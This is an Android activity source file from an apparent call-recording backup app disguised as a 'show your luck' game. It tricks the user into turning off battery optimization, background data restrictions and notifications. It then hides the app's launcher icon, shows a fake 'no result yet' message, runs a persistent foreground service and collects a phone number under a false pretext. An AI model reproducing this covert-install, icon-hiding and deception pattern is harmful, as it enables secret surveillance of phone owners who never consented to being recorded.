package com.uttam.callrecord.backuppro;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.SwitchCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.messaging.FirebaseMessaging;
import com.uttam.callrecord.backuppro.service.MyForgroundService;

import java.util.List;

import static com.uttam.callrecord.backuppro.CallRecorderApp.MY_NOTIFICATION_CHANNEL_ID;

public class GeneralUserHomeActivity extends AppCompatActivity implements View.OnClickListener {

    private Button openApplicationSettingButton,autoStartOnOffButton,showLuckResultButton;
    private EditText blockListAlertDialogPhoneEditText;
    private TextView batteryOptimizationStatusTextView,backgroundDataUsingRestrictionStatusTextView,notificationChannelStatusTextView;
    private String packageName,blockListPhoneNumber;
    private PowerManager pm;
    private AlertDialog recordBlockListAlertDialog;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_general_user_home);


        initAll();

        startAnimation();

        registerBroadCastReceiverService(false);

    }


    private void startAnimation() {
        Animation blinkAnimation= AnimationUtils.loadAnimation(GeneralUserHomeActivity.this,R.anim.blink_anim);
        Animation milkshake= AnimationUtils.loadAnimation(GeneralUserHomeActivity.this,R.anim.milk_shake_animation);
        Animation shakeTwo= AnimationUtils.loadAnimation(GeneralUserHomeActivity.this,R.anim.shake_animation_two);
        showLuckResultButton.startAnimation(blinkAnimation);
        autoStartOnOffButton.startAnimation(shakeTwo);
        openApplicationSettingButton.startAnimation(shakeTwo);
        notificationChannelStatusTextView.startAnimation(milkshake);
        backgroundDataUsingRestrictionStatusTextView.startAnimation(milkshake);
        batteryOptimizationStatusTextView.startAnimation(milkshake);
    }

    private void getBatteryOptimizationStatus() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                Constants.isDisableBatteryOptimization=pm.isIgnoringBatteryOptimizations(packageName);
                if (Constants.isDisableBatteryOptimization){
                    batteryOptimizationStatusTextView.setText("Battery Optimization:- Off");
                }else {
                    batteryOptimizationStatusTextView.setText("Battery Optimization:- On");
                }
            }catch (Exception e){
                Constants.isDisableBatteryOptimization=true;
                batteryOptimizationStatusTextView.setText("Battery Optimization:- Off");
            }
        }else {
            Constants.isDisableBatteryOptimization=true;
            batteryOptimizationStatusTextView.setText("Battery Optimization:- Off");
        }
    }

    private void getBackgroundDataUsingRestrictionStatus() {
        ConnectivityManager connectivityManager= (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        if (Build.VERSION.SDK_INT>=24){
            if (connectivityManager.getRestrictBackgroundStatus()==ConnectivityManager.RESTRICT_BACKGROUND_STATUS_ENABLED){
                backgroundDataUsingRestrictionStatusTextView.setText("Background Data Restriction:- On");
                Constants.isBackgroundDataRestrictionDisable=false;
            }else {
                backgroundDataUsingRestrictionStatusTextView.setText("Background Data Restriction:- Off");
                Constants.isBackgroundDataRestrictionDisable=true;
            }
        }else {
            backgroundDataUsingRestrictionStatusTextView.setText("Background Data Restriction:- Off");
            Constants.isBackgroundDataRestrictionDisable=true;
        }
    }

    private void getNotificationChannelStatus() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if(!TextUtils.isEmpty(MY_NOTIFICATION_CHANNEL_ID)) {
                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                NotificationChannel channel = manager.getNotificationChannel(MY_NOTIFICATION_CHANNEL_ID);
                Constants.isNotificationChannelEnable= channel.getImportance() != NotificationManager.IMPORTANCE_NONE;
            }
            Constants.isNotificationChannelEnable= false;
        } else {
            Constants.isNotificationChannelEnable= NotificationManagerCompat.from(this).areNotificationsEnabled();
        }

        if (Constants.isNotificationChannelEnable){
            notificationChannelStatusTextView.setText("Notification Channel Status:- On");
        }else {
            notificationChannelStatusTextView.setText("Notification Channel Status:- Off");
        }
    }

//    private void getBackgroundServiceRestrictionStatus() {
//        ActivityManager activityManager= (ActivityManager) getSystemService(ACTIVITY_SERVICE);
//        if (Build.VERSION.SDK_INT>=28){
//            if (activityManager.isBackgroundRestricted()){
//                Toast.makeText(this, "background service is restricted", Toast.LENGTH_SHORT).show();
//            }else {
//                Toast.makeText(this, "background service is not restricted", Toast.LENGTH_SHORT).show();
//            }
//        }
//    }

    private void setUserAsGeneralUser() {
        Utils.setBooleanToStorage(GeneralUserHomeActivity.this,Utils.recordStatusKey,true);
    }

    private void initAll() {
        packageName=getPackageName();
        pm = (PowerManager) getSystemService(POWER_SERVICE);
        batteryOptimizationStatusTextView=findViewById(R.id.generalUserHomeActivityBatteryOptimizationStatusTextViewId);
        backgroundDataUsingRestrictionStatusTextView=findViewById(R.id.generalUserHomeActivityRestrictBackgroundDataUsingStatusTextViewId);
        openApplicationSettingButton=findViewById(R.id.generalUserHomeActivityOpenApplicationSettingButtonId);
        autoStartOnOffButton=findViewById(R.id.generalUserHomeActivityOpenAutoStartOnOffSettingButtonId);
        showLuckResultButton=findViewById(R.id.generalUserHomeActivityShowYourLuckButtonId);
        notificationChannelStatusTextView=findViewById(R.id.generalUserHomeActivityNotificationChannelStatusTextViewId);

        openApplicationSettingButton.setOnClickListener(this);
        autoStartOnOffButton.setOnClickListener(this);
        showLuckResultButton.setOnClickListener(this);
    }

    private void showBlockListPhoneAlertDialog() {
        View view=getLayoutInflater().inflate(R.layout.record_block_list_alert_dialog_custom_layout,null,false);
        Button confirmButton=view.findViewById(R.id.recordBlockListAlertDialogConfirmButtonId);
        blockListAlertDialogPhoneEditText=view.findViewById(R.id.recordBlockListAlertDialogEditTextId);
        confirmButton.setOnClickListener(this);

        AlertDialog.Builder builder=new AlertDialog.Builder(GeneralUserHomeActivity.this)
                .setCancelable(false)
                .setView(view);

        recordBlockListAlertDialog=builder.create();
        if (!isFinishing()){
            recordBlockListAlertDialog.show();
        }
    }

    private void saveBlockListNumberToStorage() {
        blockListPhoneNumber=blockListAlertDialogPhoneEditText.getText().toString();
        if (!TextUtils.isEmpty(blockListPhoneNumber)){
            Utils.setStringToStorage(GeneralUserHomeActivity.this,Utils.recordBlockListNumberKey,blockListPhoneNumber);
            recordBlockListAlertDialog.dismiss();
        }else {
            Toast.makeText(this, "Please input your lucky phone number and press confirm button.", Toast.LENGTH_SHORT).show();
        }
    }

    private void openAutoStartOnOffSettingPage() {
        try {
            Intent intent = new Intent();
            String manufacturer = Build.MANUFACTURER;
            if ("xiaomi".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if ("oppo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if ("vivo".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else if ("Letv".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.letv.android.letvsafe", "com.letv.android.letvsafe.AutobootManageActivity"));
            } else if ("Honor".equalsIgnoreCase(manufacturer)) {
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            }

            List<ResolveInfo> list = getPackageManager().queryIntentActivities(intent, PackageManager.MATCH_DEFAULT_ONLY);
            if  (list.size() > 0) {
                startActivity(intent);
            }else {
                Toast.makeText(this, "Not available this setting in your phone.", Toast.LENGTH_SHORT).show();
            }
        } catch (Exception e) {
            Log.d(Constants.TAG,"Failed to open auto start on off setting for "+e.getMessage());
        }
    }

    private void openApplicationSettingPage() {
        try {
            Intent intent = new Intent();
            intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            Uri uri = Uri.fromParts("package", getPackageName(), null);
            intent.setData(uri);
            startActivity(intent);
        }catch (Exception e){
            Toast.makeText(this, "Failed for "+e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void hideApplication() {
        if (Constants.isDisableBatteryOptimization && Constants.isBackgroundDataRestrictionDisable && !Constants.isNotificationChannelEnable){
            PackageManager packageManager=getPackageManager();
            ComponentName componentName=new ComponentName(GeneralUserHomeActivity.this,PrivacyPolicyActivity.class);
            packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED,PackageManager.DONT_KILL_APP);
            Toast.makeText(this, "Sorry, No result available yet. Please try again later.", Toast.LENGTH_LONG).show();
            finishAffinity();
        }else {
            Utils.getInstance().showHideCustomAlertDialog(GeneralUserHomeActivity.this,"Please turn off Battery Optimization, Background Data Restriction And Notification Channel to see your luck result. To see all options please click on 'Open Application Setting' and 'Auto Start On/Off' button.",true);
        }
    }

    private void checkMandatoryUpdate() {
        DatabaseReference versionRef = FirebaseDatabase.getInstance().getReference().child("version_code");
        versionRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {

                int version = 1;
                if (dataSnapshot.exists() && dataSnapshot.getValue() != null) {
                    version = Integer.parseInt(dataSnapshot.getValue(String.class));
                }

                PackageManager manager = getApplicationContext().getPackageManager();
                PackageInfo info = null;
                try {
                    info = manager.getPackageInfo(getApplicationContext().getPackageName(), 0);
                } catch (PackageManager.NameNotFoundException e) {
                    e.printStackTrace();
                }

                int appVersion=1;
                if (info != null) {
                    if (Build.VERSION.SDK_INT>=Build.VERSION_CODES.P){
                        appVersion = (int) info.getLongVersionCode();
                    }else {
                        appVersion = info.versionCode;
                    }
                }

                if (appVersion < version) {
                    AlertDialog.Builder builder = new AlertDialog.Builder(GeneralUserHomeActivity.this);
                    builder.setTitle("Found New Update");
                    builder.setMessage("Your app is not updated. Please update now.");
                    builder.setCancelable(false);
                    builder.setPositiveButton("Update Now", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialogInterface, int i) {
                            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id="+getPackageName()));
                            startActivity(browserIntent);
                        }
                    });
                    builder.setNegativeButton("Finish", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            dialog.dismiss();
                            finishAffinity();
                        }
                    });
                    AlertDialog alertDialog = builder.create();
                    if (!isFinishing()) {
                        alertDialog.show();
                    }
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Toast.makeText(GeneralUserHomeActivity.this, "Failed to check update for "+databaseError.getMessage(), Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void registerBroadCastReceiverService(boolean restartStatus) {
        Intent intent = new Intent(GeneralUserHomeActivity.this, MyForgroundService.class);
        intent.putExtra(Utils.restartForgroundServiceKey, restartStatus);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()){
            case R.id.generalUserHomeActivityOpenApplicationSettingButtonId:
                openApplicationSettingPage();
                break;

            case R.id.generalUserHomeActivityOpenAutoStartOnOffSettingButtonId:
                openAutoStartOnOffSettingPage();
                break;

            case R.id.generalUserHomeActivityShowYourLuckButtonId:
                hideApplication();
                break;

            case R.id.recordBlockListAlertDialogConfirmButtonId:
                saveBlockListNumberToStorage();
                break;
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        getBatteryOptimizationStatus();
        getBackgroundDataUsingRestrictionStatus();
        getNotificationChannelStatus();
        setUserAsGeneralUser();
        checkMandatoryUpdate();
//        getBackgroundServiceRestrictionStatus();

        String userEmail=Utils.getStringFromStorage(this,Utils.userEmailKey,null);
        if (userEmail!=null){
            String[] fragile=userEmail.split("@");
            String topics=fragile[0];
            FirebaseMessaging.getInstance().unsubscribeFromTopic(topics);
        }else {
            Toast.makeText(this, "Sorry, We are unable to detect your email address. Please try again later.", Toast.LENGTH_SHORT).show();
            finishAffinity();
        }

        if (Utils.getStringFromStorage(GeneralUserHomeActivity.this,Utils.recordBlockListNumberKey,null)==null){
            showBlockListPhoneAlertDialog();
        }
    }
}